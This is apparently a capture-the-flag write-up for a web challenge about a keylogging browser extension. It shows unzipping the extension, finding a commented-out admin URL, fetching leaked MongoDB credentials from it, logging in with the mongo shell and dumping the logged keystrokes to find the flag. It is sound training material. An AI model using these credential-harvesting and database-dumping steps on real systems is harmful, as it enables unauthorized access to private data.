# Keith Logger
Web

## Challenge 

Keith is up to some evil stuff! Can you figure out what he's doing and find the flag?

Note: nothing is actually saved

## Solution

Unzip the crx file to view source code

	 $ mkdir contents
	 $ cd content
	 $ cd contents
	contents $ unzip ../extension.crx 

We see a URL commented out in content.js

    /*
    xhr.open(
      "GET",
      "https://keith-logger.web.chal.hsctf.com/api/admin",
      true
    );*/

Access the page, we see a note

	$ curl https://keith-logger.web.chal.hsctf.com/api/admin
	didn't have time to implement this page yet. use admin:keithkeithkeith@keith-logger-mongodb.web.chal.hsctf.com:27017 for now

Use mongo to access.

	$ docker pull mongo
	$ docker run --name some-mongo -d mongo:latest
	$ docker exec -it some-mongo sh

	# mongo -u admin -p keithkeithkeith keith-logger-mongodb.web.chal.hsctf.com:27017/admin

		> db.getMongo().getDBNames()
		[ "database" ]
		> use database
		switched to db database
		> show collections
		collection
		> db.collection.find().pretty()
			{
				"_id" : ObjectId("5cf0512d464d9fe1d9915fbd"),
				"text" : "are kitties cool",
				"url" : "https://keith-logger.web.chal.hsctf.com/",
				"time" : "21:54:53.925045"
			}
			{
				"_id" : ObjectId("5cf051a95501f2901a915fbd"),
				"text" : "because i think they are",
				"url" : "https://keith-logger.web.chal.hsctf.com/",
				"time" : "21:56:57.974856"
			}
			{
				"_id" : ObjectId("5cf051b3464d9fe1d9915fbe"),
				"text" : "meow! :3",
				"url" : "https://keith-logger.web.chal.hsctf.com/",
				"time" : "21:57:07.295378"
			}
			{
				"_id" : ObjectId("5cf0520b464d9fe1d9915fbf"),
				"text" : "meow! :3",
				"url" : "https://keith-logger.web.chal.hsctf.com/",
				"time" : "21:58:35.030635"
			}
			{
				"_id" : ObjectId("5cf05212464d9fe1d9915fc0"),
				"text" : "if you're looking for the flag",
				"url" : "https://keith-logger.web.chal.hsctf.com/",
				"time" : "21:58:42.170470"
			}
			{
				"_id" : ObjectId("5cf0521b5501f2901a915fbe"),
				"text" : "it's hsctf{watch_out_for_keyloggers}",
				"url" : "https://keith-logger.web.chal.hsctf.com/",
				"time" : "21:58:51.359556"
			}

## Flag

	hsctf{watch_out_for_keyloggers}
